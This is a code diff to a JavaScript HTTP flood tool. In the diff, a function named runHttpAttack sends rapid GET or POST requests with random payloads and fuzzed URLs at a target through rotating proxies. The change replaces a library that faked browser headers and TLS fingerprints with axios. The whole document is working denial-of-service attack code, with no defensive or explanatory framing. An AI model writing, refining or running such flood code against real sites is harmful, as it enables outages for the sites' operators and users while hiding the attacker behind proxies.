@@ -1,7 +1,7 @@
-const { gotScraping } = require('@apify/got-scraping');
+const axios = require('axios');
 const url = require('url');
 const crypto = require('crypto');
-const { getRandomPayload, proxyList } = require('./extensions');
+const { getRandomPayload, proxyList, getAxiosOptions } = require('./extensions');
 
 function runHttpAttack(targetUrl, durationSeconds, attackType) {
     const isPostAttack = attackType === 'post';
@@ -60,35 +60,23 @@ function runHttpAttack(targetUrl, durationSeconds, attackType) {
     const attack = () => {
         const finalUrl = fuzzUrl(targetUrl);
         
-        // got-scraping menangani header, sidik jari TLS, dan cookie secara otomatis.
-        const options = {
-            // Pilih generator header acak (chrome, firefox, etc.)
-            headerGeneratorOptions: {
-                browsers: [
-                    { name: 'chrome', minVersion: 120 },
-                    { name: 'firefox', minVersion: 120 },
-                ],
-                devices: ['desktop'],
-                operatingSystems: ['windows', 'macos'],
-            },
-            // Gunakan proxy jika tersedia
-            proxyUrl: proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined,
-            timeout: { request: 15000 },
-            retry: { limit: 0 }, // Jangan coba lagi jika gagal, langsung hitung sebagai error
-        };
+        const proxyUrl = proxyList.length > 0 ? proxyList[Math.floor(Math.random() * proxyList.length)] : undefined;
+        const options = getAxiosOptions(proxyUrl);
 
         localSent++;
 
         if (isPostAttack) {
             const { payload, type } = getRandomPayload();
+            let data = payload;
             if (type === 'json') {
-                options.json = payload;
+                // Axios handles JSON objects automatically
             } else {
-                options.form = payload;
+                // Axios handles URLSearchParams for form data
+                options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
             }
-            gotScraping.post(finalUrl, options).catch(() => { localError++; });
+            axios.post(finalUrl, data, options).catch(() => { localError++; });
         } else {
-            gotScraping.get(finalUrl, options).catch(() => { localError++; });
+            axios.get(finalUrl, options).catch(() => { localError++; });
         }
     };
  
